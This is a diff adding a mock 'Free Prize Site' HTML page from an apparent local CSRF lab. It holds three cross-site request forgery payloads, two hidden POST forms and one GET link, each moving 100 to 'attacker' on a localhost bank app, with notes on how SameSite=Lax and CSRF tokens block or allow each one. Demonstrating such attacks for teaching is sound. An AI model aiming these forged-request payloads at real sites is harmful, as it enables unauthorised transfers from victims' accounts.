@@ -1,0 +1,31 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Free Prize Site</title>
+</head>
+<body>
+  <h1>You won a prize!</h1>
+  <p>This pretend attacker page runs on 127.0.0.1, a different site from the bank on localhost.</p>
+
+  <h2>Attack A: hidden form POST</h2>
+  <p>Expected result: blocked, because SameSite=Lax holds back the cookie on a cross-site POST.</p>
+  <form id="attack-post" method="post" action="http://localhost:8103/vulnerable/transfer-post">
+    <input type="hidden" name="to" value="attacker">
+    <input type="hidden" name="amount" value="100">
+    <button>Claim prize A</button>
+  </form>
+
+  <h2>Attack B: link to a GET route</h2>
+  <p>Expected result: money moves, because SameSite=Lax allows cookies on a top-level GET.</p>
+  <a id="attack-get" href="http://localhost:8103/vulnerable/transfer?to=attacker&amount=100">Claim prize B</a>
+
+  <h2>Attack C: hidden form against the fixed route</h2>
+  <p>Expected result: blocked by SameSite=Lax, and by the missing CSRF token if a cookie ever got through.</p>
+  <form id="attack-safe" method="post" action="http://localhost:8103/safe/transfer">
+    <input type="hidden" name="to" value="attacker">
+    <input type="hidden" name="amount" value="100">
+    <button>Claim prize C</button>
+  </form>
+</body>
+</html>
